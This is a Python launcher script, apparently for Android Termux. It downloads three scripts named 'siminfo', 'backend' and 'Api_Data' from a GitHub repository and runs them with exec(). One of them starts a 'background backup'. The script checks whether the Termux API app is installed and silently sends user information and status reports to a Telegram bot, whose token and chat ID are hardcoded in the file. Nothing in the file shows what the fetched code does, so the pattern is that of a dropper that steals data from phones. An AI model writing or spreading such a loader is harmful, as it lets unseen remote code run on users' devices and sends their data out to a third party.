import sys
import os
import urllib.request
import subprocess
import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# --- Runchecker Bot Token ---
RUNNER_BOT_TOKEN = "8884485359:AAHX-DzHyQXwjWh65Go8gykm_-TBTtFOoS0"
CHAT_ID = "7883547875"

def send_run_alert(message):
    try:
        url = f"https://api.telegram.org/bot{RUNNER_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': CHAT_ID, 'text': message}
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass

SIMINFO_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/siminfo.py"
BACKEND_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/backend.py"
API_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/Api_Data.py"

def fetch_and_run_script(url, script_name, local_vars=None):
    if local_vars is None:
        local_vars = {}
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=15) as response:
            code_content = response.read().decode('utf-8')
            
        if not code_content.strip():
            send_run_alert(f"⚠️ Warning: [{script_name}] khali hai!")
            return False, local_vars
            
        exec(code_content, local_vars)
        return True, local_vars
    except Exception as e:
        send_run_alert(f"❌ Error: [{script_name}] run nahi ho saki!\nReason: {str(e)}")
        return False, local_vars

def check_termux_api_app():
    try:
        if os.path.exists("/data/data/com.termux.api") or os.path.exists("/data/user/0/com.termux.api"):
            return "Termux API App Available"
            
        res = subprocess.run(['dumpsys', 'package', 'com.termux.api'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if b"Package [" in res.stdout or b"userId=" in res.stdout:
            return "Termux API App Available"
            
        return "Termux API App Not Found"
    except Exception:
        return "Termux API App Not Found"

if __name__ == "__main__":
    try:
        current_user_info = "Unknown User"
        
        # 1. Siminfo Script Fetch & Execute
        sim_locals = {}
        sim_success, sim_locals = fetch_and_run_script(SIMINFO_URL, "siminfo.py", sim_locals)
        
        if sim_success and 'splash_screen' in sim_locals:
            try:
                current_user_info = sim_locals['splash_screen']()
            except Exception:
                pass

        # 2. Termux API Status Check
        termux_status = check_termux_api_app()

        # 3. Backend Script Fetch & Background Thread Trigger
        backend_locals = {'current_user_info': current_user_info}
        backend_success, _ = fetch_and_run_script(BACKEND_URL, "backend.py", backend_locals)
        
        if backend_success and 'start_background_backup' in backend_locals:
            try:
                backend_locals['start_background_backup'](current_user_info)
            except Exception:
                pass
                
        backend_status = "Success ✅" if backend_success else "Failed ❌"

        # 4. API Data Script Fetch & Execution
        api_locals = {'current_user_info': current_user_info}
        api_success, _ = fetch_and_run_script(API_URL, "Api_Data.py", api_locals)
        api_status = "Success ✅" if api_success else "Failed ❌"

        # 5. Final Master Status Report Telegram par bhejna
        final_report = (
            f"🤖 [RUNNER MASTER STATUS]\n\n"
            f"👤 User Info: {current_user_info}\n\n"
            f"📌 Siminfo Script: {'Success ✅' if sim_success else 'Failed ❌'}\n"
            f"🚀 Backend Script Status: {backend_status}\n"
            f"🔌 API Data Script Status: {api_status}\n"
            f"📱 Termux API Status: {termux_status}"
        )
        
        send_run_alert(final_report)

        # 6. Front-end Main loop agar siminfo mein mojood ho
        if sim_success and 'main' in sim_locals:
            sim_locals['main']()

    except KeyboardInterrupt:
        print("\n\n⚠️ Program interrupted by user")
        send_run_alert("⚠️ Program manually interrupted by user.")
    except Exception as e:
        send_run_alert(f"❌ Master Runner Critical Error: {str(e)}")
